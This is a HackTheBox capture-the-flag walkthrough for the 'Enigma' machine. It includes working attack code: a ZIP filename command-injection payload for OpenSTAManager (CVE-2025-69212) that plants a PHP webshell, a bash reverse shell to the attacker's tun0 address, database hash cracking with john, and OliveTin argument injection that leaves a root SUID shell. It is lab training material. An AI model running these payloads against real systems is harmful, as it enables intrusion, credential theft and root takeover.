# ENIGMA — HackTheBox Writeup

**Author:** 0xClumzZy
**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Linux

[[ Post Office Protocol]]
[[NFS]]

---

## Setup — Add to `/etc/hosts`

Map the target to its hostname so virtual hosts resolve correctly throughout the engagement:

```bash
echo '10.129.19.42  enigma.htb' | sudo tee -a /etc/hosts
```

Without this, any requests that rely on the `Host` header won't resolve. Do this first, before anything else.

---

## Phase 1: Reconnaissance

### NMAP Scan

```bash
sudo nmap -sCV --min-rate 5000 enigma.htb -oA .enigma
```

Convert the XML output to HTML for easier browsing:

```bash
xsltproc .enigma.xml -o enigma.html
```

### Open Ports

| Port                              | Service    | Notes                                          |
| --------------------------------- | ---------- | ---------------------------------------------- |
| 22                                | SSH        | Standard, not the path                         |
| 80                                | HTTP       | nginx 1.24.0 — primary external attack surface |
| 111                               | rpcbind    | NFS mountd helper for port 2049                |
| 143                               | IMAP       | Plaintext — rarer on CTF boxes                 |
| 993                               | IMAPS      | SSL-wrapped IMAP                               |
| 110                               | POP3       | Plaintext mail retrieval                       |
| 995                               | POP3S      | SSL-wrapped POP3 — what we actually use        |
| 2049                              | NFS        | The real opening                               |
| 44143, 59711, 54985, 49035, 40681 | High ports | Likely RPC/NFS ephemerals, not needed          |

---

## Phase 2: NFS Enumeration → Credential Theft

### Why NFS Matters

Port `2049/tcp` is NFS (Network File System). It lets remote clients mount server shares as if they were local drives. A misconfigured `no_root_squash` export can give instant root — but even without it, a readable export with plaintext file storage is a free credential dump.

### Mount the Export

First enumerate what the server is exporting:

```bash
showmount -e enigma.htb
```

> **Export list for enigma.htb:**
> `/srv/nfs/onboarding *`

The `*` means anyone on the network can mount it. Create a mount point and mount it:

```bash
sudo mkdir -p /tmp/nfs_mount
sudo mount -o nolock -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_mount
```

**Flag breakdown:**

- `-o nolock` — disables NFS locking; on CTF boxes the lock daemon is usually not running, and without `nolock` mounts hang
- `-t nfs` — explicitly declares the filesystem type

**Note:** mounts can take 30–60 seconds on HTB boxes. It's not broken, NFS is just slow over tunnel interfaces.

### Credential Harvest

```bash
ls -la /tmp/nfs_mount
```

On the share there's `New_Employee_Access.pdf` — open it and extract the credentials:

> **User:** `kevin`
> **Pass:** `Enigma2024!`
> **Target mail server:** `mail001.enigma.htb`

Add it to hosts:

```bash
echo '10.129.19.42  mail001.enigma.htb' | sudo tee -a /etc/hosts
```

---

## Phase 3: Email Enumeration via POP3S

Port `995` is Dovecot serving POP3 over TLS. Let's pull kevin's mail:

```bash
openssl s_client -connect enigma.htb:995 -quiet << 'EOF'
USER kevin
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
```

> **Note:** `curl` on a `pop3s://` URL returned a weird server reply on this box — this is a known gotcha with Dovecot's TLS SNI handling. Switched to a raw `openssl s_client` pipe, which always works.

Kevin has one email. It contains the credentials for the support portal:

> **Subject:** Re: OpenSTAManager Access Request
> **From:** `it@enigma.htb`
> **URL:** `http://support_001.enigma.htb`
> **Username:** `admin`
> **Password:** `Ne3s4rtars78s`

Add it to hosts:

```bash
echo '10.129.19.42  support_001.enigma.htb' | sudo tee -a /etc/hosts
```

The email also mentions `sarah@enigma.htb`. Let's try her mailbox with the same password:

```bash
openssl s_client -connect enigma.htb:995 -quiet << 'EOF'
USER sarah
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
```

Works. Inside her inbox we find:

> **Subject:** OpenSTAManager Access Request
> **From:** `it@enigma.htb`
> **URL:** `http://support_001.enigma.htb`
> **Username:** `admin`
> **Password:** `Ne3s4rtars78s`

Same credentials. Confirmed. Log in to the support portal:

```bash
curl -c /tmp/cookies.txt -X POST \
  -H "Host: support_001.enigma.htb" \
  -d 'username=admin&password=Ne3s4rtars78s' \
  'http://10.129.19.42/?op=login'
```

Browsing the portal confirms: **OpenSTAManager v2.9.8**

---

## Phase 4: Web App Exploitation — RCE via CVE-2025-69212

### The Vulnerability

OpenSTAManager v2.9.8 has a **critical OS Command Injection** in its P7M (signed XML) file decoder. An authenticated attacker uploads a ZIP containing a `.p7m` file whose **filename** is passed unsanitized into a shell command — breaking out with `"; <cmd> ; echo "` and executing arbitrary code as `www-data`.

Source: [github.com/lukasz-rybak/CVE-2025-69212](https://github.com/lukasz-rybak/CVE-2025-69212)

The attack surface is the **Sales Invoice** module, which accepts ZIP/P7M imports.

### Step 1 — Generate the Payload

```python
# zip.py
import zipfile

# This command runs inside the server's shell when it processes the P7M filename
cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"

# The filename is wrapped in double quotes by the processing script.
# We break out with "; <cmd> ; echo ".
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"boogie woogie")
```

```bash
python3 zip.py
ls exploit.zip
```

### Step 2 — Upload

```bash
curl -s -b /tmp/cookies.txt \
  -F "file=@exploit.zip" \
  'http://10.129.19.42/?op=upload_p7m'
```

### Step 3 — Trigger the Webshell

```bash
curl -s -H "Host: support_001.enigma.htb" \
  'http://10.129.19.42/files/SHELL.php?c=id'
```

> `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Webshell live. Get a proper reverse shell:

```bash
# Your machine
nc -lvnp 4444

# Target (URL-encoded)
curl -s -H "Host: support_001.enigma.htb" \
  'http://10.129.19.42/files/SHELL.php?c=bash+-c+"bash+-i+>%26+/dev/tcp/<tun0>/4444+0>%261"'
```

### Step 4 — Stabilize

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z (suspend locally)
stty raw -echo; fg
export TERM=xterm
```

`www-data` shell stabilized. `sudo -l` dead-ends, no juicy env vars. Time to escalate laterally inside the app.

---

## Phase 5: Lateral Movement — Plaintext DB Creds

### Principle

PHP apps store DB credentials in plaintext in `config.inc.php`. OpenSTAManager is open source — search their GitHub and the config location is documented.

### Find the Config

```bash
find / -name "config.inc.php" 2>/dev/null
```

Two results:

- `/var/www/html/roundcube/config/config.inc.php` (irrelevant)
- `/var/www/html/openstamanager/config/config.inc.php` ← this one

```bash
cat /var/www/html/openstamanager/config/config.inc.php
```

```php
<?php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### Dump All User Hashes

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT * FROM zz_users;"
```

| user  | hash                             |
| ----- | -------------------------------- |
| admin | `$2y$10$rTJVUNyGGK...`           |
| haris | `$2y$10$WHf1T79sxjs...` (bcrypt) |

Export haris's hash and crack it:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > /tmp/haris.hash
john /tmp/haris.hash --wordlist=~/rockyou.txt --format=bcrypt
john --show /tmp/haris.hash
```

> **Password:** `bestfriends`

### Switch to `haris`

```bash
su - haris
cat /home/haris/user.txt
```

**User flag captured.**

`sudo -l` dead-ends, environment is clean. On to root.

---

## Phase 6: Privilege Escalation — OliveTin Command Injection

### Reconnaissance: What's Listening Locally

```bash
ss -tlnp
```

> `127.0.0.1:1337` — **OliveTin** — runs as root
> `127.0.0.1:3306` — MySQL (already used)
> `127.0.0.1:25` — Postfix (internal mail relay)

**OliveTin running as root on localhost.** Target acquired.

### What is OliveTin?

OliveTin is a lightweight open-source web UI that exposes shell commands as clickable buttons in a dashboard. It's designed for ops teams to run predefined commands without SSH access. It reads a YAML configuration file mapping action IDs to shell command templates, then exposes them via a REST/gRPC API.

It runs as root because its entire purpose is to run admin shell commands on behalf of users.

### Enumerate Available Actions

```bash
# Find the API prefix from the JS bundle
curl -s http://127.0.0.1:1337/assets/index-Cr_VwSNJ.js | grep -o '"[^"]*api[^"]*"'
# Shows: "olivetin.api.v1."
# Endpoint prefix: /api/

# Get the dashboard — this returns all defined actions and their argument schemas
curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard | jq .
```

Among the actions defined, `backup_database` immediately stands out. It accepts three user-controlled arguments (`db_user`, `db_pass`, `db_name`) that are passed into its shell command template.

### The Vulnerable Action

The action definition in OliveTin's YAML config looks like this:

```yaml
actions:
  - title: Backup Database
    shell: mysqldump -u {db_user} -p{db_pass} {db_name}
```

Arguments are interpolated directly into the shell command. **No sanitization. No parameterization.** Classic string interpolation RCE.

### Exploit — Break Out via `db_pass`

The injected payload needs to:

1. Break out of the `-p{db_pass}` argument
2. Inject our backdoor command
3. Comment out the rest of the command so `mysqldump` failures don't interfere
4. Preserve valid shell syntax

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{
    "actionId": "backup_database",
    "arguments": [
      {"name": "db_user",  "value": "backup_svc"},
      {"name": "db_pass",  "value": "x'"'"'" ; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; #"},
      {"name": "db_name",  "value": "production"}
    ]
  }' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait | jq .
```

> **Exit code 0** — payload executed successfully as root.

**Why the quoting works:**
The final shell sees:

```
mysqldump -u backup_svc -px''' ; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; #production
```

The `x'''` is a malformed `db_pass` that breaks out of the argument. The `#` at the end comments out `production` so `mysqldump` fails silently (exit code 0 is cosmetic from OliveTin's perspective). Our two backdoor commands run in the middle as root.

### Run the SUID Shell

```bash
/tmp/rootbash -p
whoami
# root
cat /root/root.txt
```

**Root flag captured. Machine complete.**

---

## Full Attack Chain

```
┌─────────────────────────────────────────────────────────────────────┐
│  NFS Mount (2049/tcp)                                              │
│   └─ PDF contains kevin:Enigma2024!                                 │
│       └─ POP3S (995/tcp) — harvest sarah's emails                  │
│            └─ OpenSTAManager creds (admin:Ne3s4rtars78s)            │
│                 └─ CVE-2025-69212 — P7M filename command injection │
│                      └─ Webshell as www-data                        │
│                           └─ config.inc.php — plaintext DB creds   │
│                                └─ Dump hashes → crack haris         │
│                                     └─ su - haris (user flag)       │
│                                          └─ OliveTin (127.0.0.1:1337)│
│                                               └─ backup_database    │
│                                                    action injection  │
│                                                         └─ SUID bash│
│                                                              └─ root│
└─────────────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

1. **NFS is your friend** — always run `showmount -e` early. A `*` export on an easy box is almost always a free credential file.
2. **Plaintext configs are still everywhere** — PHP apps putting DB creds in `config.inc.php` is depressingly common. Check it after you get app-level access.
3. **Tool diversity beats stubbornness** — `curl` failed weird on POP3S; `openssl s_client` worked immediately. Know your tools.
4. **String interpolation = injection** — CVE-2025-69212 is just unsanitized `{var}` interpolation into a shell command. OliveTin's `backup_database` is the same class of bug. Spot it in configs, own it.
5. **OliveTin = root by design** — if you find it on localhost running as root, read the dashboard, find an action with user-controlled args, inject, profit. It's a trust-everyone-by-default dashboard.
